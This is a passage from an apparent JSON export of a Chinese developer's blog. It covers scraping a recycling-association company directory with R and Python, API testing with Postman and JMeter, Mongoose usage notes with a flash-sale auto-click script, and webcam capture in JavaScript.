class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">library</span>(rvest)</span><br><span class=\"line\"><span class=\"keyword\">library</span>(xml2)</span><br><span class=\"line\"></span><br><span class=\"line\">makeUrl &lt;- <span class=\"keyword\">function</span>(i) &#123;</span><br><span class=\"line\">  urllist = list()</span><br><span class=\"line\">  parturl &lt;- <span class=\"string\">\"http://www.sh-recycle.org/hyshow.asp?id=\"</span></span><br><span class=\"line\">  initurl &lt;- paste(parturl,i,sep = <span class=\"string\">''</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">webcontent = list()</span><br><span class=\"line\">Origin_InfoData = data.frame(<span class=\"string\">\"详细\"</span>=c(<span class=\"string\">\"备 案 号\"</span>, <span class=\"string\">\"会 员 号\"</span> ,<span class=\"string\">\"企业名称\"</span> ,<span class=\"string\">\"单位地址\"</span> ,<span class=\"string\">\"联系电话\"</span>, <span class=\"string\">\"资质认定\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (i <span class=\"keyword\">in</span> <span class=\"number\">1</span>:<span class=\"number\">1518</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  webcontent &lt;- read_html(makeUrl(i))</span><br><span class=\"line\">  temp_Table &lt;- webcontent %&gt;% html_table(fill = <span class=\"literal\">TRUE</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(length(temp_Table)==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    print(paste(<span class=\"string\">\"企业不存在,ID:\"</span>,i))</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    temp_InfoData &lt;- data.frame(temp_Table[<span class=\"number\">9</span>][])</span><br><span class=\"line\">    names(temp_InfoData) &lt;- c(<span class=\"string\">\"详细\"</span>, i)</span><br><span class=\"line\">    Origin_InfoData &lt;- merge(Origin_InfoData,temp_InfoData,by = <span class=\"string\">\"详细\"</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">head(Origin_InfoData)</span><br></pre></td></tr></table></figure>\n<p>代码很简单，但是就是300条之后就不行了，报错不明显，查也查不到。怎么解决也解决不了，十分懊恼。最后直接去看那个ID的信息发现，在这个网站上的内容条目调换了，虽然都是这几样，但是新增了一个属性，并且把顺序改了。因此导致R的数据框合并不了。最后用python获取到。顺便吐槽这个网站的结构真差，全是table,tr,td嵌套。而且嵌套之深深似海。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">1518</span>):   <span class=\"comment\">#,1518):</span></span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\turl = <span class=\"string\">\"http://www.sh-recycle.org/hyshow.asp?id=\"</span>+str(i)</span><br><span class=\"line\">\t\thtml_text = requests.get(url).text</span><br><span class=\"line\">\t\t<span class=\"comment\"># print html_text</span></span><br><span class=\"line\">\t\tsoup = BeautifulSoup(html_text, <span class=\"string\">'lxml'</span>)</span><br><span class=\"line\">\t\tinfotable = soup.findAll(<span class=\"string\">'table'</span>)[<span class=\"number\">8</span>]</span><br><span class=\"line\">\t\tinfo = infotable.findAll(<span class=\"string\">'td'</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">with</span> open(<span class=\"string\">'./ssssss.txt'</span>,<span class=\"string\">'a'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> info:</span><br><span class=\"line\">\t\t\t\tf.write(i.text.encode(<span class=\"string\">'utf-8'</span>)+<span class=\"string\">\"/\"</span>)</span><br><span class=\"line\">\t\t\tf.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">\t\t<span class=\"keyword\">pass</span></span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p>清洗<br><code>&lt; shanghaiss.txt | awk -F &quot;/&quot; &#39;{for (i=1;i&lt;=NF;i+=2)printf $i &quot;/&quot; ;printf&quot;\\n&quot;}&#39;</code></p>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><p>不得不说异步之厉害。Node.js + Request抓拉勾，分分钟被禁。而且测了一下移动端，5300多条数据好像1秒还是2秒的样子就到手了。最后的最后，不要用公司的网去爬东西。╮(╯▽╰)╭再也不能肆无忌惮了。定个小目标，看看Python下的异步写法。-_-</p>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","抓取数据"]},{"title":"Jmeter And PostMan","url":"http://iami.xyz/2016/10/05/Jmeter-PostMan/","content":"<h2 id=\"题记\"><a href=\"#题记\" class=\"headerlink\" title=\"题记\"></a>题记</h2><p>学技术的时候没空，有空的时间不想写。也算是明白别人长期写一份博客是多么的有毅力。<br>本来是打算写成两篇，但本来的本来觉得这个都没什么可写的。像一些软件这种东西都应该是上手。No matter what, 还是写了，算是有所记录吧。</p>\n<h2 id=\"前因\"><a href=\"#前因\" class=\"headerlink\" title=\"前因\"></a>前因</h2><p>大概又是一个月前，参与到部分API的编写以及交叉测试。就刚好用到了最开始学习NodeJs时的一款调试工具:Postman,当时只是顺手玩了一下，并没有用来编写测试脚本等功能。因此当重新拿起Postman时就花了一点时间去写测API的脚本。现在才知道为什么课本中说应该是由测试工程师来设定编程规范，给出单个的编写用例。当然，我是指真正的工程师，不是只会用工具的测试人员。也算了解到软件工程的重要性和文档编写的重要性。以前自己写东西的时候，都是随便写，现在自己都是设计好规范：API格式，变量命名。请求方式，返回数据，传递参数等等都是先编写好文档，然后再去编写程序的。规范性的重要不言而喻。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '&#123;printf \"%s %s \\n\",\"groupName\",$1&#125;' filename.txt &gt; testGroup.txt 增加一列</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Postman</li>\n</ul>\n<blockquote>\n<p><img src=\"/images//apiTest/Postman_1.jpg\" alt=\"postman_1\"><br><img src=\"/images//apiTest/Postman_2.jpg\" alt=\"postman_2\"></p>\n</blockquote>\n<ul>\n<li>Jmeter</li>\n</ul>\n<blockquote>\n<p><img src=\"/images//apiTest/Jmeter_1.jpg\" alt=\"Jmeter_1\"><br><img src=\"/images//apiTest/Jmeter_2.jpg\" alt=\"Jmeter_2\"></p>\n</blockquote>\n<ul>\n<li>Web Test(本图来自网络，忘了是谁制作的了，谢谢。)</li>\n</ul>\n<blockquote>\n<p><img src=\"/images//apiTest/web_test.jpg\" alt=\"WebTest\"></p>\n</blockquote>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h3><p>有时间补一章专门讲测试用例自动化生成。哦，对了，那个Jmeter脚本还可以用<font color=\"green\">Badboy</font>录制自动导出。不过有时候效果并不太好，尤其是进行大批量图片上传的压力测试。哦，还有记得用<font color=\"green\">Spotlight</font>进行服务器端的监控，这样就可以得到CPU/NET/IO/DISK/MEM等服务器上的一些关键信息，进行判断并预测真实负载。</p>\n<h3 id=\"其他补充\"><a href=\"#其他补充\" class=\"headerlink\" title=\"其他补充\"></a>其他补充</h3><ul>\n<li>记住你的目的。假如你是为了数据的准确性，精准性。就不要为了一些工具没有的功能模块而自己去劳神编写，以及也不需要花里胡哨的图表。尤其是在工作中，要注意的还有时效。某些功能就需要工具本身提供，没有，一是你没找到，二还是你没找到。三，赶紧换工具吧。</li>\n<li>tcpcopy这款工具也是压测用的，不过是用于真实的线上环境，将tcp请求引流，copy or dump下来，用于分析。</li>\n<li>后来，我说：还是去学下《周易》吧……</li>\n</ul>\n","categories":["全栈工程师"],"tags":["知识回顾"]},{"title":"Mongooser Should Know ?","url":"http://iami.xyz/2016/09/30/mongoose-with-mongo/","content":"<h3 id=\"Before\"><a href=\"#Before\" class=\"headerlink\" title=\"Before\"></a>Before</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> mongoose = <span class=\"built_in\">require</span>(<span class=\"string\">'mongoose'</span>);</span><br><span class=\"line\">mongoose.connect(<span class=\"string\">'mongodb://localhost/test'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Cat = mongoose.model(<span class=\"string\">'Cat'</span>, &#123; <span class=\"attr\">name</span>: <span class=\"built_in\">String</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> kitty = <span class=\"keyword\">new</span> Cat(&#123; <span class=\"attr\">name</span>: <span class=\"string\">'Zildjian'</span> &#125;);</span><br><span class=\"line\">kitty.save(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">err</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'meow'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>You can see the above code in mongoosejs.com. And you should know, There is not only way to connect the mongo server. </p>\n<table>\n<thead>\n<tr>\n<th>Mongoose</th>\n<th style=\"text-align:center\">Mongo</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Schema</td>\n<td style=\"text-align:center\">Document Schema</td>\n</tr>\n<tr>\n<td>Model</td>\n<td style=\"text-align:center\">Collection</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> mongoose = <span class=\"built_in\">require</span>(<span class=\"string\">'mongoose'</span>);</span><br><span class=\"line\">mongoose.connect(<span class=\"string\">'mongodb://localhost/test'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> animalSchema = mongoose.Schema(&#123; <span class=\"attr\">name</span>: <span class=\"built_in\">String</span> &#125;);</span><br><span class=\"line\"><span class=\"keyword\">var</span> Cat = mongoose.model(<span class=\"string\">'Cat'</span>,animalSchema );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> kitty = <span class=\"keyword\">new</span> Cat(&#123; <span class=\"attr\">name</span>: <span class=\"string\">'Zildjian'</span> &#125;);</span><br><span class=\"line\">kitty.save(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">err</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'meow'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>Also, you have different ways to define your function, In Schema, or In the instance of model</p>\n<h3 id=\"In-my-pratice-There-is-some-problems\"><a href=\"#In-my-pratice-There-is-some-problems\" class=\"headerlink\" title=\"In my pratice, There is some problems\"></a>In my pratice, There is some problems</h3><ul>\n<li>findOneAndUpdata(condition,updata,function(err, data){})</li>\n</ul>\n<blockquote>\n<p>If i find the data , i will return the finded data, and Updata, So, you  can’t through the data to judge which field was changed.</p>\n</blockquote>\n<ul>\n<li>when you use the method of updata(condition, udpata), what happend?</li>\n</ul>\n<blockquote>\n<p>first of all, it will be find the condition and if the conidition is existed, it would be updata, and return a Data, if not , also return a data. Like: <code>{ok:1,nModified:0,n:0}</code>, as you see, if you find, ok will be set 1, if you find and updata, the number of your updata is nModified, and n is matched number.But in mongo shell, it will return <code>{nMathced:5,nUpserted:0,nModified:3}</code>, So there also a problem, no matter what the number of filed was changed, it only dispaly <code>{ok:1,nModified:0,n:1}</code>. So , i still don’t know the number of filed.</p>\n</blockquote>\n<ul>\n<li>find ObjectId,  __id</li>\n</ul>\n<blockquote>\n<p>var ObjectId = require(‘mongoose’).Types.ObjectId;<br>when you use the find method , just like this: find({_id:ObjectId(youridvalue)})</p>\n</blockquote>\n<ul>\n<li>you can use insert in mongo shell , but not mongoose. you should use create to create a new document.</li>\n<li>save not only save, it contained updata, it the document was not found , it will be created, if not, it will update it.</li>\n</ul>\n<font color=\"red\">注意异步，异步，异步。你在操作数据库的时候，如果你需要遍历，那么你这边遍历完了，那边可能还没有返回数据。所以，当返回的时候，res.json()的那个数据只是最后一次查询得到的数据，一定要设置flag去判断是不是全部查询并且可以返回了 </font>\n\n\n<h4 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h4><p>前几天同学要买乐视手机，让我也帮忙抢。等从他发给我的界面找到真实界面，花了一个多小时写了下面这个脚本，测试也测试了，然而还是没抢到。如果不是网速的原因，那我只能怀疑的是乐视在骗人，fuck。<br>吐槽: 抢购页面，点击立即秒杀，然后再跳到真正的购物页面，然后还他妈要点立即抢购，乐视好心机，每天的抢购页面的URL编号是固定规律改变的。像我这种找到正确秒杀页面，然后又提前两分钟放脚本等着的<br>都没有抢到，这活动的真实性不可靠。　最心酸的是，打开淘宝，发现官网的抢购价还没有淘宝的便宜。。。。。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Wait = $(<span class=\"string\">\".not_start\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> MiaoSha = $(<span class=\"string\">\".rush_now\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">count = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> IntervalTime = setInterval(</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> Time   = $(<span class=\"string\">\"#timer&gt;span\"</span>).text();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(Wait.length != <span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Time ==<span class=\"string\">\"00000000\"</span>  || Wait.style.display != <span class=\"string\">\"block\"</span> || MiaoSha.style.display != <span class=\"string\">\"none\"</span> )&#123;</span><br><span class=\"line\">\t\t\t\tMiaoSha.click();</span><br><span class=\"line\">\t\t\t\tclearInterval(IntervalTime);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\tcount ++;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">\"已抢：\"</span> + count + <span class=\"string\">\"次\"</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (Time ==<span class=\"string\">\"00000000\"</span> || Wait[<span class=\"number\">0</span>].style.display != <span class=\"string\">\"block\"</span> || MiaoSha[<span class=\"number\">0</span>].style.display != <span class=\"string\">\"none\"</span> )&#123;</span><br><span class=\"line\">\t\t\t\tMiaoSha.click();</span><br><span class=\"line\">\t\t\t\tclearInterval(IntervalTime);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\tcount ++;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">\"已抢：\"</span> + count + <span class=\"string\">\"次\"</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;,<span class=\"number\">10</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"http://mongoosejs.com/\" target=\"_blank\" rel=\"noopener\">MongooseJs</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["学习笔记"]},{"title":"Use JavaScript To Open Camera And Capture Image","url":"http://iami.xyz/2016/09/23/Js-Open-camera/","content":"<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> canvas = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'canvas'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> context = canvas.getContext(<span class=\"string\">'2d'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">\"#opencamera\"</span>).click(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> video = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'video'</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(navigator.mediaDevices &amp;&amp; navigator.mediaDevices.getUserMedia) &#123;</span><br><span class=\"line\">                    navigator.mediaDevices.getUserMedia(&#123; <span class=\"attr\">video</span>: <span class=\"literal\">true</span> &#125;).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">stream</span>) </span>&#123;</span><br><span class=\"line\">                        video.src = <span class=\"built_in\">window</span>.URL.createObjectURL(stream);</span><br><span class=\"line\">                        video.play();</span><br><span class=\"line\">                        <span class=\"built_in\">window</span>.stream = stream;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">\"snap\"</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                $(<span class=\"string\">\"#VideoCapture\"</span>).hide();</span><br><span class=\"line\">                scale = <span class=\"number\">1</span>, offset_x = <span class=\"number\">0</span>, offset_y = <span class=\"number\">0</span>, fileType = <span class=\"string\">\"image/png\"</span>;</span><br><span class=\"line\">                context.drawImage(video, <span class=\"number\">0</span>, <span class=\"number\">0</span>, video.width, video.height);</span><br><span class=\"line\">                <span class=\"built_in\">window</span>.stream.getVideoTracks()[<span class=\"number\">0</span>].stop();\t<span class=\"comment\">//拍到图片后关闭视频流</span></span><br><span class=\"line\">                uploadType=<span class=\"string\">'camera'</span>;\t</span><br><span class=\"line\">                __post(appId, serviceType, <span class=\"literal\">null</span>);\t\t<span class=\"comment\">//这里是把照片发送给服务器，__post是自己定义的函数</span></span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">'#localfile'</span>).change(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> _this = $(<span class=\"keyword\">this</span>)[<span class=\"number\">0</span>], _file = _this.files[<span class=\"number\">0</span>];</span><br><span class=\"line\">                fileType = _file.type;</span><br><span class=\"line\">                $(<span class=\"string\">'#imgType'</span>).val(fileType);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (_this.value==<span class=\"string\">''</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                context.clearRect(<span class=\"number\">0</span>,<span class=\"number\">0</span>,canvas.width,canvas.height);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"regexp\">/image\\/\\w+/</span>.test(fileType)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> fileReader = <span class=\"keyword\">new</span> FileReader();</span><br><span class=\"line\">                    fileReader.readAsDataURL(_file);</span><br><span class=\"line\">                    fileReader.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">var</span> result = event.target.result;   <span class=\"comment\">//返回的dataURL</span></span><br><span class=\"line\">                        __drawFromUrl(result);</span><br><span class=\"line\">                        uploadType=<span class=\"string\">'browse'</span>;</span><br><span class=\"line\">                        __post(appId, serviceType, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> __post = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">appId, serviceType, url</span>) </span>&#123;</span><br><span class=\"line\">            $(<span class=\"string\">\"#modal\"</span>).modal(&#123;<span class=\"attr\">backdrop</span>:<span class=\"string\">\"static\"</span>&#125;);</span><br><span class=\"line\">            $(<span class=\"string\">\"#modal\"</span>).modal(<span class=\"string\">\"show\"</span>);</span><br><span class=\"line\">            $(<span class=\"string\">\"#uploadfaceimg\"</span>).show();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (url != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> postdata = &#123;<span class=\"attr\">url</span>: url, <span class=\"attr\">serviceType</span>: serviceType&#125;;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (uploadType==<span class=\"string\">'camera'</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> newImageData = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'canvas'</span>).toDataURL(fileType, <span class=\"number\">0.8</span>);　<span class=\"comment\">//利用toDataUrl, 把绘制在Canvas上的图片导出.</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> imageBase64 = newImageData.replace(<span class=\"string\">\"data:\"</span>+fileType+<span class=\"string\">\";base64,\"</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> postdata = &#123;<span class=\"attr\">imgType</span>: fileType, <span class=\"attr\">image</span>: imageBase64, <span class=\"attr\">serviceType</span>: serviceType&#125;;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(uploadType==<span class=\"string\">'browse'</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> formData = <span class=\"keyword\">new</span> FormData($(<span class=\"string\">\"#fileform\"</span>)[<span class=\"number\">0</span>]);</span><br><span class=\"line\">                $.ajax(&#123;</span><br><span class=\"line\">                    url: <span class=\"string\">'/me/'</span>+appId+<span class=\"string\">'/detection/detect'</span>,</span><br><span class=\"line\">                    type: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">                    data: formData,</span><br><span class=\"line\">                    <span class=\"keyword\">async</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                    cache: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                    contentType: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                    processData: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;</span><br><span class=\"line\">                        __dealdetect(data);</span><br><span class=\"line\">                        $(<span class=\"string\">'#localfile'</span>).val(<span class=\"string\">''</span>);</span><br><span class=\"line\">                    &#125;,<span class=\"attr\">error</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">                        <span class=\"built_in\">console</span>.log(<span class=\"string\">'imgUploader upload fail, data:'</span> +  data);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">'uploadType error'</span>);</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h4><p>这里面的思路是把拍到的图片绘制到canvas上，然后利用canvas的toDataURL,将其以流的方式发送或者保存。</p>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Blob\" 